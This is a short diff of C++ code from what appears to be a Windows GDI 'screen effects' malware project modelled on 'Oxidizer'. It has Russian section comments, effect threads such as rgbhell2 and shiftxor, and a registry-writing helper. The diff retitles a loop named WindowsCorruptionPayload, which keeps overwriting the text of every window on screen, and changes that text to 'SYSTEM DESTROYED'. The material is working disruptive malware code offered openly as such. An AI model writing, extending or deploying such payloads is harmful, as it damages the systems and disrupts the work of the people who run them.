@@ -142,8 +142,6 @@ void reg_add(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, u
     RegCloseKey(hKey);
 }
 
-// ==================== НОВЫЕ ЭФФЕКТЫ В СТИЛЕ OXIDIZER ====================
-
 // === ЭФФЕКТ 9: RGB АД 2.0 (ускоренный хаос) ===
 DWORD WINAPI rgbhell2(LPVOID lpvd) {
     HDC hdc = GetDC(NULL);
@@ -311,8 +309,6 @@ DWORD WINAPI shiftxor(LPVOID lpvd) {
         Sleep(20 + rand() % 30);
     }
 }
-
-// ==================== СТАРЫЕ ЭФФЕКТЫ ИЗ OXIDIZER ====================
 
 DWORD WINAPI shader1(LPVOID lpvd) {
     HDC hdc = GetDC(NULL);
@@ -623,7 +619,7 @@ DWORD WINAPI opener(LPVOID lpParam) {
 DWORD WINAPI WindowsCorruptionPayload(LPVOID lpParam) {
     while (1) {
         EnumChildWindows(NULL, [](HWND hwnd, LPARAM lParam) -> BOOL {
-            SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"💀 OXIDIZED 💀", SMTO_ABORTIFHUNG, 100, NULL);
+            SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"💀 SYSTEM DESTROYED 💀", SMTO_ABORTIFHUNG, 100, NULL);
             return TRUE;
         }, NULL);
         Sleep(100);
